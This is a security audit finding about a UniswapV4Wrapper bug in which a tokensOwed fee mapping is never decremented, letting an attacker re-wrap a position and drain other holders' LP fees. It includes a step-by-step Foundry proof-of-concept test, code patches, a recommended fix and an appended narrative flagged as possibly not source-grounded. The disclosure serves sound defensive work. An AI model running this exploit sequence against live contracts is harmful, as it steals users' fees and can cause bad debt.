---
id: 23477
severity: "High"
---

# Fees can be stolen from partially unwrapped UniswapV4Wrapper positions

## Description

ERC721WrapperBase exposes two overloads of the `unwrap()` function to perform full and partial unwrap of the ERC‑6909 position for a given `tokenId`:

```solidity
function unwrap(address from, uint256 tokenId, address to) external callThroughEVC {
    _burnFrom(from, tokenId, totalSupply(tokenId));
    underlying.transferFrom(address(this), to, tokenId);
}
function unwrap(address from, uint256 tokenId, address to, uint256 amount, bytes calldata extraData)
    external
    callThroughEVC
{
    _unwrap(to, tokenId, amount, extraData);
    _burnFrom(from, tokenId, amount);
}
```

The full unwrap assumes the caller owns the entire ERC‑6909 token supply and will transfer the underlying Uniswap position after burning these tokens. The partial unwrap burns a specified amount of ERC‑6909 tokens from the caller and handles proportional distribution of LP fees between all ERC‑6909 holders through the virtual `_unwrap()` function.

In Uniswap V3, the LP fee balance is accounted separately from the underlying principal amount such that the pool does not immediately send accrued fees to the user when liquidity is modified but instead increases the `tokensOwed` balance of the position. `UniswapV3Wrapper::_unwrap` calculates the proportion owed to a given ERC‑6909 holder based on the owed token accounting managed by the `NonFungiblePositionManager` contract which allows an exact amount to be passed to the `collect()` call:

```solidity
function _unwrap(address to, uint256 tokenId, uint256 amount, bytes calldata extraData) internal
override {
    (,,,,,,, uint128 liquidity,,,,) =
        INonfungiblePositionManager(address(underlying)).positions(tokenId);
    (uint256 amount0, uint256 amount1) =
        _decreaseLiquidity(tokenId, proportionalShare(tokenId, uint256(liquidity), amount).toUint128(),
        extraData);
    (,,,,,,,,,, uint256 tokensOwed0, uint256 tokensOwed1) =
        INonfungiblePositionManager(address(underlying)).positions(tokenId);
    // amount0 and amount1 is the part of the liquidity
    // token0Owed - amount0 and token1Owed - amount1 are the total fees (the principal is always
    // collected in the same tx). part of the fees needs to be sent to the recipient as well,
    INonfungiblePositionManager(address(underlying)).collect(
        INonfungiblePositionManager.CollectParams({
            tokenId: tokenId,
            recipient: to,
            amount0Max: (amount0 + proportionalShare(tokenId, (tokensOwed0 - amount0),
                amount)).toUint128(),
            amount1Max: (amount1 + proportionalShare(tokenId, (tokensOwed1 - amount1),
                amount)).toUint128()
        })
    );
}
```

During the modification of liquidity in Uniswap V4 the `PoolManager` transfers the entire balance of earned LP fees directly to the user and requires the delta to be settled in the same transaction. Because ERC‑6909 tokens corresponding to the underlying Uniswap V4 positions can have multiple holders, it would be incorrect to forward all these fees to the owner who is currently unwrapping their portion. `UniswapV4Wrapper::_unwrap` therefore first accumulates these fees in storage with the `tokensOwed` mapping and utilizes this state for subsequent partial unwraps of other ERC‑6909 token holders, distributing only a share of the corresponding token balance to the specified recipient when interacting with their position:

```solidity
function _unwrap(address to, uint256 tokenId, uint256 amount, bytes calldata extraData) internal
override {
    PositionState memory positionState = _getPositionState(tokenId);
    (uint256 pendingFees0, uint256 pendingFees1) = _pendingFees(positionState);
    _accumulateFees(tokenId, pendingFees0, pendingFees1);
    uint128 liquidityToRemove = proportionalShare(tokenId, positionState.liquidity, amount).toUint128();
    (uint256 amount0, uint256 amount1) = _principal(positionState, liquidityToRemove);
    _decreaseLiquidity(tokenId, liquidityToRemove, ActionConstants.MSG_SENDER, extraData);
    poolKey.currency0.transfer(to, amount0 + proportionalShare(tokenId, tokensOwed[tokenId].fees0Owed,
        amount));
    poolKey.currency1.transfer(to, amount1 + proportionalShare(tokenId, tokensOwed[tokenId].fees1Owed,
        amount));
}
```

Unlike `UniswapV3Wrapper`, the `UniswapV4Wrapper` is expected to hold a non‑zero balance of `currency0` and `currency1` for a partially unwrapped ERC‑6909 position until all the holders of this `tokenId` have unwrapped. While the partial unwrap is intended for use following partial liquidations, it can be used to perform a full unwrap. The proportional share calculations will transfer the underlying principal balance plus LP fees to the sole holder, leaving the empty liquidity position in the wrapper contract. Since the total supply of ERC‑6909 tokens will be reduced to zero, `_burnFrom()` can be called by any sender without reverting, allowing the empty Uniswap V4 position to be recovered by subsequently invoking the full unwrap.

The `tokensOwed` state is never decremented. This edge case can be exploited by repeatedly wrapping and unwrapping a position that was previously partially unwrapped:

1. Alice wraps a Uniswap V4 position.  
2. Time passes and the position accumulates fees.  
3. Alice fully unwraps the position using the partial unwrap overload, causing liquidity and fees to be decreased to zero.  
4. Alice fully unwraps to retrieve the underlying position and increases its liquidity again.  
5. Alice re‑wraps the same Uniswap V4 position and is minted the full corresponding ERC‑6909 balance.  
6. Although fully unwrapped, the `tokensOwed` mapping still contains non‑zero values from the first wrap.  
7. Alice can now reuse this stale state to siphon tokens out of the `UniswapV4Wrapper`, stealing LP fees intended for other holders.

This also causes a denial‑of‑service for other holders attempting to fully unwrap their partial balance, potentially affecting liquidations and causing bad debt in the vault.

## Proof of Concept

Apply the following patch and execute `forge test --mt test_feeTheftPoC -vvv`:

```diff
--- a/vii-finance-smart-contracts/src/uniswap/periphery/UniswapMintPositionHelper.sol
+++ b/vii-finance-smart-contracts/src/uniswap/periphery/UniswapMintPositionHelper.sol
@@ -124,5 +124,57 @@ contract UniswapMintPositionHelper is EVCUtil {
 positionManager.modifyLiquidities{value: address(this).balance}(abi.encode(actions, params),
 block.timestamp);,!
 }
+ function increaseLiquidity(
+ PoolKey calldata poolKey,
+ uint256 tokenId,
+ uint128 liquidityDelta,
+ uint256 amount0Max,
+ uint256 amount1Max,
+ address recipient
+ ) external payable {
+ Currency curr0 = poolKey.currency0;
+ Currency curr1 = poolKey.currency1;
+
+ if (amount0Max > 0) {
+ address t0 = Currency.unwrap(curr0);
+ if (!curr0.isAddressZero()) {
+ IERC20(t0).safeTransferFrom(msg.sender, address(this), amount0Max);
+ } else {
+ // native ETH case
+ require(msg.value >= amount0Max, "Insufficient ETH");
+ weth.deposit{value: amount0Max}();
+ }
+ }
+ if (amount1Max > 0) {
+ address t1 = Currency.unwrap(curr1);
+ IERC20(t1).safeTransferFrom(msg.sender, address(this), amount1Max);
+ }
+
+ if (!curr0.isAddressZero()) {
+ curr0.transfer(address(positionManager), amount0Max);
+ }
+
+ curr1.transfer(address(positionManager), amount1Max);
+
+ bytes memory actions = new bytes(5);
+ actions[0] = bytes1(uint8(Actions.INCREASE_LIQUIDITY));
+ actions[1] = bytes1(uint8(Actions.SETTLE));
+ actions[2] = bytes1(uint8(Actions.SETTLE));
+ actions[3] = bytes1(uint8(Actions.SWEEP));
+ actions[4] = bytes1(uint8(Actions.SWEEP));
+
+ bytes[] memory params = new bytes[](5);
+ params[0] = abi.encode(tokenId, liquidityDelta, amount0Max, amount1Max, bytes(""));
+ params[1] = abi.encode(curr0, ActionConstants.OPEN_DELTA, false);
+ params[2] = abi.encode(curr1, ActionConstants.OPEN_DELTA, false);
+ params[3] = abi.encode(curr0, recipient);
+ params[4] = abi.encode(curr1, recipient);
+
+ positionManager.modifyLiquidities{ value: address(this).balance }(
+ abi.encode(actions, params),
+ block.timestamp
+ );
+ }
+
+receive() external payable {}
+ }
```

```diff
--- a/vii-finance-smart-contracts/test/uniswap/UniswapV4Wrapper.t.sol
+++ b/vii-finance-smart-contracts/test/uniswap/UniswapV4Wrapper.t.sol
@@ -125,7 +125,7 @@ contract UniswapV4WrapperTest is Test, UniswapBaseTest {
 TestRouter public router;
- bool public constant TEST_NATIVE_ETH = true;
+ bool public constant TEST_NATIVE_ETH = false;
 function deployWrapper() internal override returns (ERC721WrapperBase) {
 currency0 = Currency.wrap(address(token0));
@@ -258,6 +258,36 @@ contract UniswapV4WrapperTest is Test, UniswapBaseTest {
 amount0 = token0BalanceBefore - targetPoolKey.currency0.balanceOf(owner);
 amount1 = token1BalanceBefore - targetPoolKey.currency1.balanceOf(owner);
 }
+
+ function increasePosition(
+ PoolKey memory targetPoolKey,
+ uint256 targetTokenId,
+ uint128 liquidity,
+ uint256 amount0Desired,
+ uint256 amount1Desired,
+ address owner
+ ) internal returns (uint256 amount0, uint256 amount1) {
+ deal(address(token0), owner, amount0Desired * 2 + 1);
+ deal(address(token1), owner, amount1Desired * 2 + 1);
+
+ uint256 token0BalanceBefore = targetPoolKey.currency0.balanceOf(owner);
+ uint256 token1BalanceBefore = targetPoolKey.currency1.balanceOf(owner);
+
+ mintPositionHelper.increaseLiquidity{value: targetPoolKey.currency0.isAddressZero() ?
+ amount0Desired * 2 + 1 : 0}(,!
+ targetPoolKey, targetTokenId, liquidity, amount0Desired, amount1Desired, owner
+ );
+
+ //ensure any unused tokens are returned to the borrower and position manager balance is zero
+ // assertEq(targetPoolKey.currency0.balanceOf(address(positionManager)), 0);
+ assertEq(targetPoolKey.currency1.balanceOf(address(positionManager)), 0);
+
+ //for some reason, there is 1 wei of dust native eth left in the mintPositionHelper contract
+ // assertEq(targetPoolKey.currency0.balanceOf(address(mintPositionHelper)), 0);
+ assertEq(targetPoolKey.currency1.balanceOf(address(mintPositionHelper)), 0);
+
+ amount0 = token0BalanceBefore - targetPoolKey.currency0.balanceOf(owner);
+ amount1 = token1BalanceBefore - targetPoolKey.currency1.balanceOf(owner);
+ }
```

```solidity
function test_feeTheftPoC() public {
    int256 liquidityDelta = -19999;
    uint256 swapAmount = 100_000 * unit0;

    LiquidityParams memory params = LiquidityParams({
        tickLower: TickMath.MIN_TICK + 1,
        tickUpper: TickMath.MAX_TICK - 1,
        liquidityDelta: liquidityDelta
    });

    // 1. create position on behalf of borrower
    (uint256 tokenId1,,) = boundLiquidityParamsAndMint(params);

    address attacker = makeAddr("attacker");
    deal(token0, attacker, 100 * unit0);
    deal(token1, attacker, 100 * unit1);
    startHoax(attacker);
    SafeERC20.forceApprove(IERC20(token0), address(router), type(uint256).max);
    SafeERC20.forceApprove(IERC20(token1), address(router), type(uint256).max);
    SafeERC20.forceApprove(IERC20(token0), address(mintPositionHelper), type(uint256).max);
    SafeERC20.forceApprove(IERC20(token1), address(mintPositionHelper), type(uint256).max);

    // 2. create position on behalf of attacker
    (uint256 tokenId2,,) = boundLiquidityParamsAndMint(params, attacker);

    // 3. wrap and enable tokenId1 for borrower
    startHoax(borrower);
    wrapper.underlying().approve(address(wrapper), tokenId1);
    wrapper.wrap(tokenId1, borrower);
    wrapper.enableTokenIdAsCollateral(tokenId1);

    // 4. wrap and enable tokenId2 for attacker
    startHoax(attacker);
    wrapper.underlying().approve(address(wrapper), tokenId2);
    wrapper.wrap(tokenId2, attacker);
    wrapper.enableTokenIdAsCollateral(tokenId2);

    // 5. swap so that some fees are generated for tokenId1 and tokenId2
    swapExactInput(borrower, address(token0), address(token1), swapAmount);

    (uint256 expectedFees0Position1, uint256 expectedFees1Position1) =
        MockUniswapV4Wrapper(payable(address(wrapper))).pendingFees(tokenId1);
    (uint256 expectedFees0Position2, uint256 expectedFees1Position2) =
        MockUniswapV4Wrapper(payable(address(wrapper))).pendingFees(tokenId2);

    console.log("Expected Fees Position 1: %s, %s", expectedFees0Position1, expectedFees1Position1);
    console.log("Expected Fees Position 2: %s, %s", expectedFees0Position2, expectedFees1Position2);

    // 6. unwrap 10% of tokenId1 for borrower which causes fees to be transferred to wrapper
    startHoax(borrower);
    wrapper.unwrap(
        borrower,
        tokenId1,
        borrower,
        wrapper.balanceOf(borrower, tokenId1) / 10,
        bytes("")
    );

    console.log("Wrapper balance of currency0: %s", currency0.balanceOf(address(wrapper)));
    console.log("Wrapper balance of currency1: %s", currency1.balanceOf(address(wrapper)));

    // 7. attacker fully unwraps tokenId2 through partial unwrap
    startHoax(attacker);
    wrapper.unwrap(
        attacker,
        tokenId2,
        attacker,
        wrapper.FULL_AMOUNT(),
        bytes("")
    );

    console.log("Wrapper balance of currency0: %s", currency0.balanceOf(address(wrapper)));
    console.log("Wrapper balance of currency1: %s", currency1.balanceOf(address(wrapper)));

    // 8. attacker recovers tokenId2 position
    wrapper.unwrap(
        attacker,
        tokenId2,
        attacker
    );

    // 9. attacker increases liquidity for tokenId2
    IERC721(wrapper.underlying()).approve(address(mintPositionHelper), tokenId2);
    increasePosition(poolKey, tokenId2, 1000, type(uint96).max, type(uint96).max, attacker);

    // 10. attacker wraps tokenId2 again
    wrapper.underlying().approve(address(wrapper), tokenId2);
    wrapper.wrap(tokenId2, attacker);

    // 11. attacker steals borrower's fees by partially unwrapping tokenId2 again
    wrapper.unwrap(
        attacker,
        tokenId2,
        attacker,
        wrapper.FULL_AMOUNT() * 9 / 10,
        bytes("")
    );

    console.log("Wrapper balance of currency0: %s", currency0.balanceOf(address(wrapper)));
    console.log("Wrapper balance of currency1: %s", currency1.balanceOf(address(wrapper)));

    // 12. borrower tries to unwrap a further 10% of tokenId1 but it reverts because the owed fees
    // were stolen,
    // startHoax(borrower);
    // wrapper.unwrap(
    //     borrower,
    //     tokenId1,
    //     borrower,
    //     wrapper.FULL_AMOUNT() / 10,
    //     bytes("")
    // );
}
```

## Recommendation

Recommended mitigation: Decrement the `tokensOwed` state for a given ERC‑6909 `tokenId` once the corresponding fees have been collected:

```solidity
function _unwrap(address to, uint256 tokenId, uint256 amount, bytes calldata extraData) internal
override {
    PositionState memory positionState = _getPositionState(tokenId);
    // ... existing logic ...

    uint256 proportionalFee0 = proportionalShare(tokenId, tokensOwed[tokenId].fees0Owed, amount);
    uint256 proportionalFee1 = proportionalShare(tokenId, tokensOwed[tokenId].fees1Owed, amount);
    tokensOwed[tokenId].fees0Owed -= proportionalFee0;
    tokensOwed[tokenId].fees1Owed -= proportionalFee1;

    // Adjust transfers to use the decremented fees
    poolKey.currency0.transfer(to, amount0 + proportionalFee0);
    poolKey.currency1.transfer(to, amount1 + proportionalFee1);
}
```

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is a fee‑theft bug in the UniswapV4Wrapper that tokenizes Uniswap V4 liquidity positions using ERC‑6909 tokens. The root cause is that the wrapper’s internal tokensOwed mapping, which records accrued LP fees when a position is partially unwrapped, is never decremented after those fees are transferred to the caller. Because the wrapper also allows a full unwrap that burns all ERC‑6909 tokens and then permits the same position to be re‑wrapped, the stale tokensOwed entries remain in storage even after the underlying liquidity has been recovered. An attacker can exploit this by first wrapping a position, letting fees accrue, performing a partial unwrap (which records fees), then fully unwrapping to retrieve the liquidity and re‑wrapping the same position. When the attacker later performs another partial unwrap, the contract uses the old tokensOwed values to calculate a proportional fee share and transfers those fees to the attacker, effectively stealing fees that should belong to other token holders. The impact is that LP fees can disappear from the rightful owners, causing users to see zero balances or missing refunds in the UI, and can also lead to denial‑of‑service for other holders attempting to unwrap, potentially blocking liquidations and creating bad debt in dependent vaults. The issue occurs only when a position has been partially unwrapped at least once and then fully unwrapped and re‑wrapped; it is hard to notice because the wrapper still holds the fee tokens internally, so external balance checks may appear normal while the accounting is corrupted. The bug was discovered during a security audit that exercised wrap/unwrap cycles and observed that the tokensOwed state never changed after fee collection. To remediate, the contract must decrement tokensOwed.fees0Owed and tokensOwed.fees1Owed by the proportional amounts actually paid out during each unwrap, ensuring that fee accounting reflects the true state and preventing stale fee balances from being reused. This correction restores the intended business logic that fees are distributed proportionally and only once, aligning the wrapper’s accounting with the expectations of users who anticipate receiving their earned fees rather than seeing them disappear.
